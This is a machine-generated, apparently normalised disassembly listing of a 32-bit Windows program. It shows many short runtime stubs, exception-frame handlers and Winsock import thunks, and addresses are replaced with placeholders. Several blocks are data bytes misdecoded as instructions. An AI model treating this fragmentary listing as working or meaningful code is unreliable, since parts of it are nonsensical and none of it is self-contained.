pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ae0c06
add [ eax ] al
bound esp [ edi ]
mov ebx 0xd06a7700
adc [ ebp + 0x4fc00035 ] esp
xlat
shl [ edx - 0x75 ] 0x1
add [ edx + eax + 0x108b0000 ] 0xff
push edx
adc al 0xc3
mov eax [ r-xdata ]
retn
sub_3ae0c2c
push esi
mov esi eax
mov eax [ esi + 0x2dc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_3ae0c3c
mov eax [ r-xdata ]
retn
sub_3ae0d7e
add [ eax ] al
mov eax [ eax + 0x258 ]
retn
sub_3ae0d88
mov eax 0x10
retn
sub_3ae0f2f
jmp sub_3a64b54
sub_3ae0f36
pop ebx
pop ecx
pop ebp
retn
sub_3ae0f98
mov ecx [ eax + 0x268 ]
mov [ edx ] ecx
mov ecx [ eax + 0x26c ]
mov [ edx + 0x4 ] ecx
retn
sub_3ae0fac
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x268 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x26c ] edx
pop ebp
retn 0x8
sub_3ae107a
jmp sub_3a64b54
sub_3ae1081
pop ecx
pop ebp
retn
sub_3ae1110
mov eax [ eax + 0x1c ]
call sub_3a7b4fc
retn
sub_3ae1259
jmp sub_3a64b54
sub_3ae1260
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ae128c
mov eax [ eax + 0x1c ]
call sub_3a7b21c
retn
sub_3ae1298
mov eax [ eax + 0x1c ]
call sub_3a7b21c
retn
sub_3ae12a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov eax [ eax + 0x14 ]
pop esi
pop ebx
retn
sub_3ae1360
mov ecx [ eax ]
call [ ecx + 0x54 ]
retn
sub_3ae1368
push ebx
mov ebx ecx
mov eax [ eax + 0x1c ]
call sub_3ae014c
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
sub_3ae13fc
mov eax [ r-xdata ]
retn
sub_3ae1404
mov eax [ r-xdata ]
retn
sub_3ae1474
jmp sub_3a64b54
sub_3ae147b
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_3ae1550
jmp sub_3a64b54
sub_3ae1557
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_3ae1614
mov eax [ eax + 0xc ]
call sub_3a7b21c
retn
sub_3ae170a
jmp sub_3a64b54
sub_3ae1711
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_3ae171c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax + 0x10 ] edx
xor eax eax
pop ebp
retn 0x4
sub_3ae17cb
jmp sub_3a64b54
sub_3ae17d2
pop ebp
retn
sub_3ae17d4
mov ecx [ edx ]
cmp ecx 0x40
jge r-xdata
retn
mov [ edx + ecx * 4 + 0x4 ] eax
inc [ edx ]
sub_3ae17e4
xor edx edx
mov [ eax ] edx
retn
accept
jmp [ accept@IAT ]
bind
jmp [ bind@IAT ]
closesocket
jmp [ closesocket@IAT ]
connect
jmp [ connect@IAT ]
getpeername
jmp [ getpeername@IAT ]
getsockopt
jmp [ getsockopt@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
listen
jmp [ listen@IAT ]
ntohs
jmp [ ntohs@IAT ]
recv
jmp [ recv@IAT ]
send
jmp [ send@IAT ]
socket
jmp [ socket@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
getservbyname
jmp [ getservbyname@IAT ]
WSAAsyncSelect
jmp [ WSAAsyncSelect@IAT ]
WSAAsyncGetHostByName
jmp [ WSAAsyncGetHostByName@IAT ]
WSAAsyncGetServByName
jmp [ WSAAsyncGetServByName@IAT ]
WSACancelAsyncRequest
jmp [ WSACancelAsyncRequest@IAT ]
WSAGetLastError
jmp [ WSAGetLastError@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
sub_3ae2880
jmp sub_3a64b54
sub_3ae2887
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ae2919
jmp sub_3a64b54
sub_3ae2920
pop ebx
mov esp ebp
pop ebp
retn
sub_3ae29bb
jmp sub_3a64b54
sub_3ae29c2
pop ebx
mov esp ebp
pop ebp
retn
sub_3ae2ac4
retn
sub_3ae2d15
jmp sub_3a648a0
sub_3ae2d80
mov edx [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_3ae2d8c
retn
sub_3ae2d90
mov eax [ eax + 0x40 ]
call sub_3a90e94
retn
sub_3ae2d9c
mov eax [ eax + 0x40 ]
call sub_3a90e9c
retn
sub_3ae2eec
call sub_3a64380
retn
sub_3ae2ef4
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push 0x0
push 0x0
push 0x402
push edx
call PostMessageA
sub_3ae30f9
jmp sub_3a64b54
sub_3ae3327
jmp sub_3a648a0
sub_3ae342a
jmp sub_3a648a0
sub_3ae351a
jmp sub_3a64b54
sub_3ae3588
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_3ae3793
jmp sub_3a64b54
sub_3ae37ac
xor ecx ecx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax ecx
retn
mov [ eax + 0xc ] edx
call sub_3ae3620
mov ecx eax
sub_3ae38c9
jmp sub_3a64b54
sub_3ae38e6
jmp sub_3a64b54
sub_3ae38ed
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ae3930
push esi
mov ecx [ eax + 0x4 ]
cmp ecx 0xffffffff
je r-xdata
pop esi
retn
cmp ecx edx
jne r-xdata
mov cl 0x7
mov edx eax
mov si 0xffff
call sub_3a6457c
sub_3ae3aa0
jmp sub_3a64b54
sub_3ae3abd
jmp sub_3a64b54
sub_3ae3ac4
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ae3ae0
or ecx 0xffffffff
xor edx edx
call sub_3ae394c
retn
sub_3ae3b62
jmp sub_3a648a0
sub_3ae3cee
jmp sub_3a64b54
sub_3ae3cf5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ae3d11
add [ eax ] al
add [ esi - 0x3a ] dl
inc eax
or [ ecx ] al
mov cl 0x2
mov edx eax
mov si 0xffff
call sub_3a6457c
pop esi
retn
sub_3ae3f6e
jmp sub_3a64b54
sub_3ae3f75
pop ebx
pop ecx
pop ebp
retn
sub_3ae3fc5
jmp sub_3a64b54
sub_3ae3fcc
pop ebx
pop ecx
pop ebp
retn
sub_3ae403f
jmp sub_3a64b54
sub_3ae4046
pop ebx
pop ecx
pop ebp
retn
sub_3ae4095
jmp sub_3a64b54
sub_3ae409c
pop ebx
pop ecx
pop ebp
retn
sub_3ae40f4
push ebp
mov ebp esp
push esi
mov edx [ ebp + 0x8 ]
push edx
mov edx ecx
movzx ecx [ ebp + 0xc ]
mov si 0xfff5
call sub_3a6457c
pop esi
pop ebp
retn 0x8
j_sub_3a649cc#3
jmp sub_3a649cc
sub_3ae424e
jmp sub_3a64b54
sub_3ae4352
jmp sub_3a64b54
sub_3ae4359
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae4376
mov eax [ ebp - 0x4 ]
call sub_3ae2d9c
retn
sub_3ae436f
jmp sub_3a64b54
sub_3ae4376
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ae4380
push edx
xor ecx ecx
mov eax [ r-xdata ]
mov dl 0x1
call sub_3ae473c
retn
sub_3ae44bb
jmp sub_3a64b54
sub_3ae450c
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_3ae452c
push ebx
cmp [ eax + 0x82 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_3ae45d6
jmp sub_3a64b54
sub_3ae4620
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_3ae4670
push ebx
cmp [ eax + 0xa2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_3ae4690
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_3ae4874
push ebx
push esi
mov edx [ eax + 0x40 ]
mov ecx [ edx + 0x58 ]
mov bl 0x7
mov eax ecx
mov ecx ebx
mov si 0xffff
call sub_3a6457c
pop esi
pop ebx
retn
sub_3ae4890
push ebx
mov ebx eax
mov eax ebx
call sub_3a832cc
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_3ae404c
sub_3ae48ac
push esi
mov cl 0x6
mov edx [ eax + 0x40 ]
mov eax [ eax + 0x44 ]
mov si 0xffff
call sub_3a6457c
pop esi
retn
sub_3ae48c0
push ebp
mov ebp esp
movzx edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop ebp
retn 0x4
sub_3ae48d0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x8
sub_3ae48e8
push edx
mov ecx [ eax + 0x40 ]
mov edx [ eax + 0x44 ]
xchg edx eax
call sub_3ae40a0
retn
sub_3ae48f8
push edx
push ecx
mov edx [ eax + 0x44 ]
mov ecx eax
mov eax [ eax + 0x40 ]
xchg edx eax
xchg edx ecx
call sub_3ae40f4
retn
sub_3ae4967
jmp sub_3a64b54
sub_3ae496e
pop ebx
pop ecx
pop ebp
retn
sub_3ae49d6
jmp sub_3a648a0
sub_3ae4a0f
jmp sub_3a64b54
sub_3ae4a16
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ae4b0c
push ebp
mov ebp esp
push ebx
mov edx ecx
movzx ecx [ ebp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
pop ebp
retn 0x4
sub_3ae4b20
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
push edx
mov edx ecx
movzx ecx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
pop ebp
retn 0x8
sub_3ae4b58
mov [ edx + 0x34 ] eax
mov [ edx + 0x30 ] sub_3ae4b0c
mov [ edx + 0x3c ] eax
mov [ edx + 0x38 ] sub_3ae4b20
retn
sub_3ae4b70
push ebx
mov ebx eax
mov eax ebx
call sub_3a83acc
movzx edx [ ebx + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
pop ebx
retn
sub_3ae4bfb
jmp sub_3a64b54
sub_3ae4c02
pop ebx
pop ecx
pop ebp
retn
sub_3ae4c7b
jmp sub_3a64b54
sub_3ae4c82
pop ebx
pop ecx
pop ebp
retn
sub_3ae4d27
jmp sub_3a64b54
sub_3ae4d2e
pop ebx
pop ecx
pop ebp
retn
sub_3ae4f48
mov eax [ eax + 0x90 ]
movzx eax [ eax + 0x58 ]
retn
sub_3ae4f54
mov eax [ eax + 0x90 ]
call sub_3ae3d28
retn
sub_3ae4fd4
mov eax [ eax + 0x90 ]
movzx eax [ eax + 0x58 ]
retn
sub_3ae4fe0
mov eax [ eax + 0x90 ]
call sub_3ae43dc
retn
sub_3ae4fec
mov eax [ eax + 0x90 ]
mov ecx [ eax + 0x78 ]
mov [ edx ] ecx
mov ecx [ eax + 0x7c ]
mov [ edx + 0x4 ] ecx
retn
sub_3ae5000
push ebp
mov ebp esp
mov eax [ eax + 0x90 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x78 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x7c ] edx
pop ebp
retn 0x8
sub_3ae501c
mov eax [ eax + 0x90 ]
mov ecx [ eax + 0x70 ]
mov [ edx ] ecx
mov ecx [ eax + 0x74 ]
mov [ edx + 0x4 ] ecx
retn
sub_3ae5030
push ebp
mov ebp esp
mov eax [ eax + 0x90 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x70 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x74 ] edx
pop ebp
retn 0x8
sub_3ae504c
mov eax [ eax + 0x90 ]
mov eax [ eax + 0x5c ]
retn
sub_3ae5058
mov eax [ eax + 0x90 ]
call sub_3ae4430
retn
sub_3ae5064
mov eax [ eax + 0x90 ]
mov ecx [ eax + 0x80 ]
mov [ edx ] ecx
mov ecx [ eax + 0x84 ]
mov [ edx + 0x4 ] ecx
retn
sub_3ae507c
mov eax [ eax + 0x90 ]
mov ecx [ eax + 0x88 ]
mov [ edx ] ecx
mov ecx [ eax + 0x8c ]
mov [ edx + 0x4 ] ecx
retn
sub_3ae5094
push ebp
mov ebp esp
mov eax [ eax + 0x90 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x80 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x84 ] edx
pop ebp
retn 0x8
sub_3ae50b4
push ebp
mov ebp esp
mov eax [ eax + 0x90 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
pop ebp
retn 0x8
sub_3ae51c8
mov eax [ eax + 0x90 ]
mov ecx [ eax + 0xb0 ]
mov [ edx ] ecx
mov ecx [ eax + 0xb4 ]
mov [ edx + 0x4 ] ecx
retn
sub_3ae51e0
push ebp
mov ebp esp
mov eax [ eax + 0x90 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0xb0 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0xb4 ] edx
pop ebp
retn 0x8
sub_3ae541c
mov eax edx
call sub_3a62efc
retn
sub_3ae5424
push ebp
mov ebp esp
movzx ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
call sub_3a63a44
pop ebp
retn
sub_3ae544c
push 0x38
mov ecx r-xdata
call sub_3ae57b4
retn
sub_3ae5464
mov edx r-xdata
mov ecx 0x38
call sub_3ae6e3c
retn
sub_3ae54d9
jmp sub_3a64b54
sub_3ae54e0
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ae5545
jmp sub_3a64b54
sub_3ae554c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ae5644
jmp sub_3a64b54
sub_3ae5668
jmp sub_3a648a0
sub_3ae566d
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_3a62efc
call sub_3a64c5c
call sub_3a64cb0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3ae576b
jmp sub_3a64b54
sub_3ae578f
jmp sub_3a648a0
sub_3ae5794
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_3a62efc
call sub_3a64c5c
call sub_3a64cb0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3ae57b4
push ebp
mov ebp esp
push 0xf
push 0x8
push 0x0
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx 0x8
call sub_3ae57d0
pop ebp
retn 0x4
sub_3ae6e3c
push ecx
mov ecx 0xf
xchg edx ecx
call sub_3ae6d30
retn
sub_3ae81a4
cmp [ eax ] 0x1
sete al
and eax 0x1
retn
sub_3ae919c
push ebx
mov ebx edx
mov edx [ edx + 0x28 ]
xchg edx eax
call [ ebx + 0x24 ]
pop ebx
retn
sub_3ae9780
retn
sub_3aeb7b4
jmp sub_3a64b54
sub_3aebec4
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_3aebed8
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_3aebeec
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_3aebf00
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_3aebfce
jmp sub_3a64b54
sub_3aebfdc
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_3aebff0
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_3aec004
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_3aec018
push ebx
cmp [ eax + 0x82 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_3aec034
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_3aec0a4
push ebx
cmp [ eax + 0xa2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_3aec0c0
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_3aec0fc
inc [ eax + 0x3c ]
retn
sub_3aec420
jmp sub_3a64b54
sub_3aec427
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aec49c
jmp sub_3a64b54
sub_3aec4a3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aec513
jmp sub_3a64b54
sub_3aec51a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aec587
jmp sub_3a64b54
sub_3aec58e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aec643
jmp sub_3a64b54
sub_3aec64a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aec6d9
jmp sub_3a64b54
sub_3aec6e0
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_3aec757
jmp sub_3a64b54
sub_3aec75e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aec7d0
jmp sub_3a64b54
sub_3aec7d7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aec84c
jmp sub_3a64b54
sub_3aec853
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aec8c3
jmp sub_3a64b54
sub_3aec8ca
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aec937
jmp sub_3a64b54
sub_3aec93e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aec9b0
jmp sub_3a64b54
sub_3aec9b7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aeca30
jmp sub_3a64b54
sub_3aeca37
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_3aecab4
jmp sub_3a64b54
sub_3aecabb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_3aecb14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_3a84cf4
pop esi
pop ebx
retn
sub_3aecb28
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_3aecb97
jmp sub_3a64b54
sub_3aecb9e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aecc0b
jmp sub_3a64b54
sub_3aecc12
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aecc3d
jmp sub_3a64b54
sub_3aecc44
pop ebp
retn
sndPlaySoundA
jmp [ sndPlaySoundA@IAT ]
sub_3aeccd0
jmp sub_3a64b54
sub_3aeccd7
pop ebx
pop ecx
pop ebp
retn
sub_3aecd9b
jmp sub_3a64b54
sub_3aecda2
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3aed23e
jmp sub_3a64b54
sub_3aed36d
jmp sub_3a64b54
sub_3aed374
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_3aed4dd
jmp sub_3a64b54
sub_3aed4e4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_3aed5ee
jmp sub_3a64b54
sub_3aed5f5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3aedf8d
jmp sub_3a648a0
sub_3aedf99
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aedfc0
lea eax [ ebp - 0x2c ]
mov edx 0xb
call sub_3a652c4
retn
sub_3aedfb9
jmp sub_3a64b54
sub_3aedfc0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aee2bf
inc [ ecx ]
add [ eax ] al
add [ edi ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
cmp [ ecx ] 0x20
jne r-xdata
pop ebp
retn 0x4
mov [ ecx ] 0x0
sub_3aee430
jmp sub_3a64b54
sub_3aee437
pop ebx
mov esp ebp
pop ebp
retn
sub_3aee491
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
cmp [ ecx ] 0x20
jne r-xdata
pop ebp
retn 0x4
mov [ ecx ] 0x0
sub_3aee52b
jmp sub_3a64b54
sub_3aee532
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3aee611
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3aee61a
jmp sub_3a64b54
j_sub_3aee611
jmp sub_3aee611
sub_3aee621
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aee690
push ebx
mov ebx eax
mov eax [ ebx + 0x364 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
test al al
je r-xdata
pop ebx
retn
mov edx r-xdata
mov eax [ ebx + 0x384 ]
call sub_3ae35c4
sub_3aeebb0
jmp sub_3a64b54
sub_3aeebb7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aeec70
push ebp
mov ebp esp
cmp [ ecx ] 0x20
jne r-xdata
pop ebp
retn 0x4
mov [ ecx ] 0x0
sub_3aef2ae
jmp sub_3a648a0
sub_3aef2ba
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3aef31a
jmp sub_3a648a0
sub_3aef31f
call sub_3a64cb0
jmp sub_3aef32b
sub_3aef326
call sub_3a64cb0
sub_3aef32b
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3aef386
jmp sub_3a648a0
sub_3aef38b
call sub_3a64cb0
jmp sub_3aef397
sub_3aef392
call sub_3a64cb0
sub_3aef397
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3aef3f2
jmp sub_3a648a0
sub_3aef3f7
call sub_3a64cb0
jmp sub_3aef403
sub_3aef3fe
call sub_3a64cb0
sub_3aef403
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3aef45e
jmp sub_3a648a0
sub_3aef463
call sub_3a64cb0
jmp sub_3aef46f
sub_3aef46a
call sub_3a64cb0
sub_3aef46f
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3aef4ca
jmp sub_3a648a0
sub_3aef4cf
call sub_3a64cb0
jmp sub_3aef4db
sub_3aef4d6
call sub_3a64cb0
sub_3aef4db
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3aef5b3
jmp sub_3a64b54
sub_3aef5ba
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aef63e
jmp sub_3a648a0
sub_3aef64a
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aef674
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3aef66d
jmp sub_3a64b54
sub_3aef674
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_3aef909
jmp sub_3a64b54
j_sub_3aef8b6
jmp sub_3aef8b6
sub_3aef910
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aef9c8
jmp sub_3a648a0
sub_3aef9d4
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aef9fe
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3aef9f7
jmp sub_3a64b54
sub_3aef9fe
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3aefa75
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3aefa7e
jmp sub_3a64b54
j_sub_3aefa75
jmp sub_3aefa75
sub_3aefa85
pop ebx
pop ecx
pop ebp
retn
sub_3aefb3a
jmp sub_3a64b54
sub_3aefb41
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3aefbfc
jmp sub_3a648a0
sub_3aefc01
call sub_3a64cb0
jmp sub_3aefc0d
sub_3aefc08
call sub_3a64cb0
sub_3aefc0d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aefc32
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3aefc2b
jmp sub_3a64b54
sub_3aefc32
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3aefd10
jmp sub_3a648a0
sub_3aefd15
call sub_3a64cb0
jmp sub_3aefd21
sub_3aefd1c
call sub_3a64cb0
sub_3aefd21
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aefd4b
lea eax [ ebp - 0xc ]
call sub_3a652a0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3aefd44
jmp sub_3a64b54
sub_3aefd4b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aeff11
jmp sub_3a64b54
j_sub_3aefece
jmp sub_3aefece
sub_3aeff18
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af00ed
jmp sub_3a64b54
j_sub_3af00aa
jmp sub_3af00aa
sub_3af00f4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af016c
jmp sub_3a648a0
sub_3af019c
retn
sub_3af0233
jmp sub_3a648a0
sub_3af023f
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af0269
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af0262
jmp sub_3a64b54
sub_3af0269
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3af0324
jmp sub_3a648a0
sub_3af0329
call sub_3a64cb0
jmp sub_3af0335
sub_3af0330
call sub_3a64cb0
sub_3af0335
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af035a
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af0353
jmp sub_3a64b54
sub_3af035a
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_3a648a0#9
jmp sub_3a648a0
sub_3af0451
jmp sub_3a64b54
sub_3af0458
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af0491
jmp sub_3a64b54
sub_3af0498
pop ebp
retn
sub_3af07a9
jmp sub_3a64b54
sub_3af07b0
pop ebx
pop ecx
pop ebp
retn
sub_3af07b4
push ebx
mov ebx eax
mov edx r-xdata
mov eax [ ebx + 0x380 ]
call sub_3ae35c4
mov eax [ ebx + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ eax ]
call [ edx + 0x44 ]
pop ebx
retn
sub_3af090b
lea eax [ ebp - 0x1c ]
call sub_3a652a0
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_3a652c4
retn
sub_3af092e
jmp sub_3a64b54
j_sub_3af090b
jmp sub_3af090b
sub_3af0935
pop ebx
mov esp ebp
pop ebp
retn
sub_3af1037
jmp sub_3a64b54
sub_3af103e
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3af12fa
jmp sub_3a64b54
sub_3af1396
jmp sub_3a64b54
sub_3af13bc
push ebx
mov ebx eax
push ebx
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3af1250
call sub_3a64c34
pop ebx
retn
sub_3af13d8
test eax 0x80000000
je r-xdata
retn
call sub_3af13bc
sub_3af15dc
jmp sub_3a64b54
